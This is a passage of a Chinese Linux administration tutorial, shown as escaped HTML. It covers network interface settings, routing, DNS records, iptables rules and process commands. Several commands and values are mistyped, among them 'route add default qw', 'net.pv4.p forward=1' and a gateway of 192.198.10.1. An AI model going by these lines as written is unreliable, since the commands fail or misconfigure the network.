class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.10.100&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;PREFIX&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;24&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;GATEWAY&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;192.198&lt;/span&gt;.10.1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#################################&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;下面介绍改配置文件中的每一行的含义。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#################################&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;DEVICE&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;:网卡设备名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;HWADDR&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;:网卡的物理地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;:网卡的类型&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;:网卡的UUID&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;IPADDR&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;:IP地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;NETMASK&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;:子网掩码&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;GATEWAY&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;:网关&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;DNS1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;:DNS&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;ONBOOT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;:该网卡是否激活&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;NM_CONTROLLED&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;:网络是否由NetworkManager进行管理&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;BOOTPROTO&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;：启动远程协议为静态设置&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;路由的查看及配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#路由的查看及配置&#34;&gt;#&lt;/a&gt; 路由的查看及配置&lt;/h2&gt;
&lt;p&gt;路由 (route) 就是分组在因特网上从一台计算机传输到另一台计算机的实际路径。&lt;br /&gt;
因特网上的每个路由器都存储有一张表，称为路由表 (routing table), 路由器正是依据路由表的内容将各个 IP 分组转发到正确的去处。&lt;/p&gt;
&lt;p&gt;路由，路由器，路由表的区别:&lt;/p&gt;
&lt;p&gt;路由：既可以指计算机之间的传输路径，又可以指传输这一动态过程&lt;br /&gt;
路由器：设备，即完成路由这一动态过程的设备&lt;br /&gt;
路由表：信息，是储存在路由器中的用来路由的信息&lt;/p&gt;
&lt;p&gt;查看路由命令：&lt;br /&gt;
 &lt;code&gt;netstat -r&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;route -n&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;查看本机路由信息&lt;br /&gt;
 &lt;code&gt;route -n&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;添加一条默认路由，临时生效 (重启后就会失效)&lt;br /&gt;
 &lt;code&gt;route add default qw 192.168.10.1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;删除一条默认路由&lt;br /&gt;
 &lt;code&gt;route del default gw 192.168.10.1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;添加一条静态路由，发往 192.168.8.62 这个网段的全部要经过网关 192.168.1.1&lt;br /&gt;
 &lt;code&gt;route add-net 192.168.8.0 netmask 255.255.255.0 gw 192.168.1.1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;删除一条静态路由，删除的时候可以不写网关&lt;br /&gt;
 &lt;code&gt;route del -net 192.168.8.0 netmask 255.255.255.0 gw 192.168.1.1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;设置包转发功能:&lt;/p&gt;
&lt;p&gt;开启 Liunx 的路由转发功能:&lt;br /&gt;
 编辑 /etc/sysctl.conf 设置 net.pv4.p forward=1&lt;/p&gt;
&lt;p&gt;临时配置：&lt;br /&gt;
 &lt;code&gt;echo &amp;quot;1&amp;quot; &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;dns&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns&#34;&gt;#&lt;/a&gt; DNS&lt;/h2&gt;
&lt;p&gt;Linux 下查看本地的 DNS:&lt;br /&gt;
1.cat /etc/resolv.conf&lt;br /&gt;
2.nslookup &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5iYWlkdS5jb20=&#34;&gt;www.baidu.com&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;dns-查询工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-查询工具&#34;&gt;#&lt;/a&gt; DNS 查询工具&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;nslookup 是一个能够查询互联网域名服务器信息的程序。&lt;br /&gt;
他有两种工作模式，即 &amp;quot;交互模式&amp;quot; 和 &amp;quot;非交互模式&amp;quot;&lt;br /&gt;
在&amp;quot; 交互模式 &amp;quot; 下，用户可以向域名服务器查询各类主机、域名的信息，或者输出域名中的主机列表。&lt;br /&gt;
而在 “非交互模式 &amp;quot; 下，用户可以针对一个主机或域名仅仅获取特定的名称或所需信息。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Dig 是一个在类 Unix 命令行模式下查询 DNS 包括 NSi 录，A 记录，MX 记录等相关信息的工具。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;dig 命令:&lt;br /&gt;
 查询一台主机，但是默认情况下，Dig 的输出信息很详细&lt;br /&gt;
最常用的查询是 A 记录，TXT (文本注释) , MXi 录，NS 记录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;dns域名解析中添加的各项解析记录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns域名解析中添加的各项解析记录&#34;&gt;#&lt;/a&gt; DNS 域名解析中添加的各项解析记录&lt;/h3&gt;
&lt;p&gt;A 记录： 将域名指向一个 IPv4 地址（例如：100.100.100.100），需要增加 A 记录&lt;/p&gt;
&lt;p&gt;CNAME 记录： 如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加 CNAME 记录。这个域名一般是主机服务商提供的一个域名&lt;/p&gt;
&lt;p&gt;MX 记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置 MX 记录。建立邮箱时，一般会根据邮箱服务商提供的 MX 记录填写此记录&lt;/p&gt;
&lt;p&gt;NS 记录： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置 NS 记录&lt;/p&gt;
&lt;p&gt;TXT 记录： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做 SPF（反垃圾邮件）记录&lt;/p&gt;
&lt;p&gt;AAAA 记录： 将主机名（或域名）指向一个 IPv6 地址（例如：ff03:0:0:0:0:0:0:c1），需要添加 AAAA 记录&lt;/p&gt;
&lt;p&gt;SRV 记录： 添加服务记录服务器服务记录时会添加此项，SRV 记录了哪台计算机提供了哪个服务。格式为：服务的名字。协议的类型（例如：_example-server._tcp）。&lt;/p&gt;
&lt;p&gt;SOA 记录： SOA 叫做起始授权机构记录，NS 用于标识多台域名解析服务器，SOA 记录用于在众多 NS 记录中那一台是主服务器&lt;/p&gt;
&lt;p&gt;PTR 记录： PTR 记录是 A 记录的逆向记录，又称做 IP 反查记录或指针记录，负责将 IP 反向解析为域名&lt;/p&gt;
&lt;p&gt;显性 URL 转发记录： 将域名指向一个 http (s) 协议地址，访问域名时，自动跳转至目标地址。例如：将 www.liuht.cn 显性转发到 www.itbilu.com 后，访问 www.liuht.cn 时，地址栏显示的地址为：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5pdGJpbHUuY29t&#34;&gt;www.itbilu.com&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;隐性 UR 转发记录 L： 将域名指向一个 http (s) 协议地址，访问域名时，自动跳转至目标地址，隐性转发会隐藏真实的目标地址。例如：将 www.liuht.cn 显性转发到 www.itbilu.com 后，访问 www.liuht.cn 时，地址栏显示的地址仍然是：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5saXVodC5jbg==&#34;&gt;www.liuht.cn&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Reference:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmx1ZXN0b3JtL3AvMTAzNDUzMzQuaHRtbA==&#34;&gt;https://www.cnblogs.com/bluestorm/p/10345334.html&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;iptables详解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iptables详解&#34;&gt;#&lt;/a&gt; iptables 详解&lt;/h1&gt;
&lt;h2 id=&#34;防火墙类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防火墙类型&#34;&gt;#&lt;/a&gt; 防火墙类型&lt;/h2&gt;
&lt;h3 id=&#34;包过滤防火墙&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#包过滤防火墙&#34;&gt;#&lt;/a&gt; 包过滤防火墙&lt;/h3&gt;
&lt;p&gt;在 Linux 系统下，包过滤功能是内建于核心的 (作为一个核心模块，或者直接内建) , 同时还有一些可以运用于数据包之上的技巧，不过最常用的依然是查看包头以决定包的命运。包过滤防火墙将对每一个接收到的包做出允许或拒绝的决定。具体地讲，它针对每一个数据包的包头，按照包过滤规则进行判定，与规则相匹配的包依据路由信息继续转发，否则就丢弃。包过滤是在 IP 层实现的，包过滤根据数据包的源 P 地址、目的 IP 地址、协议类型 (TCP 包 UDP 包、ICMP 包)、源端口、目的端口等包头信息及数据包传输方向等信息来判断是否允许数据包通过。 包过滤也包括与服务相关的过滤，这是指基于特定的服务进行包过滤，由于绝大多数服务的监听都驻留在特定 TCP/UDP 端口，因此，为阻断所有进入特定服务的链接，防火墙只需将所有包含特定 TCP/UDP 目的端口的包丢弃即可&lt;/p&gt;
&lt;h3 id=&#34;状态检测防火墙&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#状态检测防火墙&#34;&gt;#&lt;/a&gt; 状态检测防火墙&lt;/h3&gt;
&lt;p&gt;状态检测防火墙在网络层有一个检查引擎截获数据包并抽取出与应用层状态有关的信息，并以此为依据决定对该连接是接受还是拒绝。这种技术提供了高度安全的解决方案，同时具有较好的适应性和扩展性。状态检测防火墙基本保持了简单包过滤防火墙的优点，性能比较好，同时对应用是透明的，在此基础上，对于安全性有了大幅提升。这种防火墙摒弃了简单包过滤防火墙仅仅考察进出网络的数据包，不关心数据包状态的缺点，在防火墙的核心部分建立状态连接表，维护了连接，将进出网络的数据当成一个个的事件来处理。可以这样说，状态检测包过滤防火墙规范了网络层和传输层行为，而应用代理型防火墙则是规范了特定的应用协议上的行为。&lt;/p&gt;
&lt;h2 id=&#34;iptables介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iptables介绍&#34;&gt;#&lt;/a&gt; iptables 介绍&lt;/h2&gt;
&lt;p&gt;netfilter/iptables (简称为 iptables) 组成 Linux 平台下的包过滤防火墙，与大多数的 Linux 软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换 (NAT) 等功能。&lt;/p&gt;
&lt;p&gt;其实 iptables 服务不是真正的防火墙，只是用来定义防火墙规则功能的 &amp;quot;防火墙管理工具&amp;quot;, 将定义好的规则交由内核中的 netfilter 即网络过滤器来读取，从而真正实现防火墙功能。&lt;/p&gt;
&lt;h2 id=&#34;iptables基本信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iptables基本信息&#34;&gt;#&lt;/a&gt; iptables 基本信息&lt;/h2&gt;
&lt;p&gt;规则 (rules) 其实就是网络管理员预定义的条件，规则一般的定义为 &amp;quot;如果数据包头符合这样的条件，就这样处理这个数据包&amp;quot;&lt;/p&gt;
&lt;p&gt;规则存储在内核空间的信息包过滤表中，这些规则分别指定了源地址、目的地址、传输协议 (如 TCP, UDP,ICMP) 和服务类型 (如 HTTP, FTP 和 SMTP) 等。&lt;/p&gt;
&lt;p&gt;当数据包与规则匹配时，iptables 就根据规则所定义的方法来处理这些数据包，如放行 (accept) 、拒绝 (reject) 和丢弃 (drop) 等。&lt;/p&gt;
&lt;p&gt;配置防火墙的主要工作就是添加、修改和删除这些规则。&lt;/p&gt;
&lt;h2 id=&#34;表与链介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#表与链介绍&#34;&gt;#&lt;/a&gt; 表与链介绍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;表 (tables) 提供特定的功能，iptables 内置了 4 个表，即 filter 表、nat 表、mangle 表和 raw 表，分别用于实现包过滤，网络地址转换、包重构 (修改) 和数据跟踪处理，这些表具有一定的优先级: raw--&amp;gt;mangle--&amp;gt;nat--&amp;gt;filter&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;链 (chains) 是数据包传播的路径，每一条链其实就是众多规则中的一个检查清单，每一条链中可以有一条或数条规则。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;规则链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#规则链&#34;&gt;#&lt;/a&gt; 规则链&lt;/h2&gt;
&lt;h3 id=&#34;一些需要知道的规则链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一些需要知道的规则链&#34;&gt;#&lt;/a&gt; 一些需要知道的规则链&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;INPUT - 进来的数据包应用此规则链中的策略&lt;/li&gt;
&lt;li&gt;OUTPUT - 外出的数据包应用此规则链中的策略&lt;/li&gt;
&lt;li&gt;FORWARD - 转发数据包时应用此规则链中的策略&lt;/li&gt;
&lt;li&gt;PREROUTING - 对数据包作路由选择前应用此链中的规则 (记住！所有的数据包进来的时候都先由这个链处理)&lt;/li&gt;
&lt;li&gt;POSTROUTING - 对数据包作路由选择后应用此链中的规则 (所有的数据包出来的时候都先由这个链处理)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;完整的规则链&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image005.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;规则表的先后顺序:&lt;br /&gt;
raw-&amp;gt;mangle-&amp;gt;nat-&amp;gt;filter&lt;/p&gt;
&lt;p&gt;规则链的先后顺序:&lt;br /&gt;
 入站顺序 PREROUTING-&amp;gt;INPUT&lt;br /&gt;
 出站顺序：OUTPUT-&amp;gt;POSTROUTING&lt;br /&gt;
 转发顺序：PREROUTING-&amp;gt;FORWARD-&amp;gt;POSTROUTING&lt;/p&gt;
&lt;h2 id=&#34;iptables传输数据包的过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iptables传输数据包的过程&#34;&gt;#&lt;/a&gt; iptables 传输数据包的过程&lt;/h2&gt;
&lt;p&gt;当一个数据包进入网卡时，它首先进入 PREROUTING 链，内核根据数据包目的 IP 判断是否需要转送出去。&lt;/p&gt;
&lt;p&gt;如果数据包就是进入本机的，它就会向下移动，到达 INPUT 链。数据包到了 INPUT 链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过 OUTPUT 链，然后到达 POSTROUTING 链输出。&lt;/p&gt;
&lt;p&gt;如果数据包是要转发出去的，且内核允许转发，数据包就会经过 FORWARD 链，然后到达 POSTROUTING 链输出。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image006.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;iptables命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iptables命令&#34;&gt;#&lt;/a&gt; iptables 命令&lt;/h2&gt;
&lt;p&gt;iptables 格式:&lt;br /&gt;
iptables [-t 表名] 选项 [链名] [条件] [-j 控制类型]&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image007.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;详细解释见&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdmF0aGUvcC82OTczNjU2Lmh0bWw=&#34;&gt; https://www.cnblogs.com/vathe/p/6973656.html&lt;/span&gt;&lt;br /&gt;
 有人总结的挺全的就不造轮子了（懒）。&lt;/p&gt;
&lt;h2 id=&#34;iptables常识与常用命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iptables常识与常用命令&#34;&gt;#&lt;/a&gt; iptables 常识与常用命令&lt;/h2&gt;
&lt;p&gt;CentOS7 默认的防火墙不是 iptables, 而是 firewalle.&lt;br /&gt;
 如果你没有安装 iptables 的话，你可以使用以下命令进行安装&lt;br /&gt;
 systemctl stop firewalld&lt;br /&gt;
systemctl disable firewalld&lt;br /&gt;
systemctl mask firewalld&lt;br /&gt;
 上面的意思是先屏蔽掉原有的 firewall 防火墙，下面我们就开始安装 iptables，至于为什么要安装 IPtables 我就不讲了&lt;br /&gt;
 yum install iptables iptables-services -y&lt;/p&gt;
&lt;p&gt;设置规则&lt;br /&gt;
 #查看 iptables 现有规则&lt;br /&gt;
 iptables -L -n&lt;br /&gt;
# 先允许所有，不然有可能会杯具&lt;br /&gt;
 iptables -P INPUT ACCEPT&lt;br /&gt;
# 清空所有默认规则&lt;br /&gt;
 iptables -F&lt;br /&gt;
# 清空所有自定义规则&lt;br /&gt;
 iptables -X&lt;br /&gt;
# 所有计数器归 0&lt;br /&gt;
iptables -Z&lt;br /&gt;
# 允许来自于 lo 接口的数据包 (本地访问)&lt;br /&gt;
iptables -A INPUT -i lo -j ACCEPT&lt;br /&gt;
# 开放 22 端口&lt;br /&gt;
 iptables -A INPUT -p tcp --dport 22 -j ACCEPT&lt;br /&gt;
# 开放 21 端口 (FTP)&lt;br /&gt;
iptables -A INPUT -p tcp --dport 21 -j ACCEPT&lt;br /&gt;
# 开放 80 端口 (HTTP)&lt;br /&gt;
iptables -A INPUT -p tcp --dport 80 -j ACCEPT&lt;br /&gt;
# 开放 443 端口 (HTTPS)&lt;br /&gt;
iptables -A INPUT -p tcp --dport 443 -j ACCEPT&lt;br /&gt;
# 允许 ping&lt;br /&gt;
iptables -A INPUT -p icmp --icmp-type 8 -j ACCEPT&lt;br /&gt;
# 允许接受本机请求之后的返回数据 RELATED, 是为 FTP 设置的&lt;br /&gt;
 iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT&lt;br /&gt;
# 其他入站一律丢弃&lt;br /&gt;
 iptables -P INPUT DROP&lt;br /&gt;
# 所有出站一律绿灯&lt;br /&gt;
 iptables -P OUTPUT ACCEPT&lt;br /&gt;
# 所有转发一律丢弃&lt;br /&gt;
 iptables -P FORWARD DROP&lt;/p&gt;
&lt;p&gt;其他规则设定&lt;br /&gt;
 #如果要添加内网 ip 信任（接受其所有 TCP 请求）&lt;br /&gt;
iptables -A INPUT -p tcp -s 45.96.174.68 -j ACCEPT&lt;br /&gt;
# 过滤所有非以上规则的请求&lt;br /&gt;
 iptables -P INPUT DROP&lt;br /&gt;
# 要封停一个 IP，使用下面这条命令：&lt;br /&gt;
iptables -I INPUT -s ... -j DROP&lt;br /&gt;
# 要解封一个 IP，使用下面这条命令:&lt;br /&gt;
iptables -D INPUT -s ... -j DROP&lt;/p&gt;
&lt;p&gt;#保存上述规则&lt;br /&gt;
 service iptables save&lt;br /&gt;
 开启 iptables 服务&lt;br /&gt;
 #注册 iptables 服务&lt;br /&gt;
 #相当于以前的 chkconfig iptables on&lt;br /&gt;
systemctl enable iptables.service&lt;br /&gt;
# 开启服务&lt;br /&gt;
 systemctl start iptables.service&lt;br /&gt;
# 查看状态&lt;br /&gt;
 systemctl status iptables.service&lt;/p&gt;
&lt;h1 id=&#34;linux进程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux进程&#34;&gt;#&lt;/a&gt; Linux 进程&lt;/h1&gt;
&lt;p&gt;推荐一篇博客，《&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW51eC5jbi9hcnRpY2xlLTg0NTEtMS5odG1s&#34;&gt;关于 Linux 进程你所需要知道的一起&lt;/span&gt;》&lt;/p&gt;
&lt;h2 id=&#34;top命令实时的查看进程的状态&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#top命令实时的查看进程的状态&#34;&gt;#&lt;/a&gt; top 命令：实时的查看进程的状态&lt;/h2&gt;
&lt;p&gt;top 是一个前台程序，所以是可以交互的&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;常用交互命令&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;解释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;q&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;退出程序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;l&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;切换显示平均负载和启动时间的信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;P&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;根据 CPU 使用百分比大小进行排序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;M&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;根据驻留内存大小进行排序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;i&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;忽略闲置和僵死的进程，这是一个开关式命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;k&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;终止一个进程，系统提示输入 PID 及发送的信号值。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;ps命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ps命令&#34;&gt;#&lt;/a&gt; ps 命令&lt;/h2&gt;
&lt;p&gt;ps -ef 显示所有进程的详细信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image008.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;UID&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;PID&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;PPID&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;C&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;STIME&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;TTY&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;CMD&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;用户 ID&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;进程的 ID&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;父进程 ID&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;进程占用 CPU 的百分比&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;进程启动的时间&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;该进程在那个终端上运行。若与终端无关，则显示？若为 pts/0 等，则表示由网络连和参数接主机进程。&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;命令的名称和参数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;ps -aux 显示所有进程信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image009.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;img data-src=&#34;image010.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;ps -A 显示所有的进程信息&lt;br /&gt;
 ps -u root 显示指定用户的进程信息&lt;br /&gt;
 ps -l 显示目前属于本次登陆得 PID 相关信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ps -ef|grep sshd|grep -v &amp;quot;grep&amp;quot;&lt;/code&gt;  配合管道符与 grep，显示 sshd 的进程信息。&lt;/p&gt;
&lt;h2 id=&#34;kill-命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kill-命令&#34;&gt;#&lt;/a&gt; kill 命令&lt;/h2&gt;
&lt;p&gt;kill 命令：用于删除执行的程序或工作，通过向进程发送指定的信号来结束进程。&lt;/p&gt;
&lt;p&gt;用法：kill  [信号] PID&lt;/p&gt;
&lt;p&gt;常用信号：&lt;br /&gt;
2  结束进程，不是强制性的，&amp;quot;Ctrl + C&amp;quot; 发出的就是 kill -2 信号&lt;br /&gt;
 3  退出&lt;br /&gt;
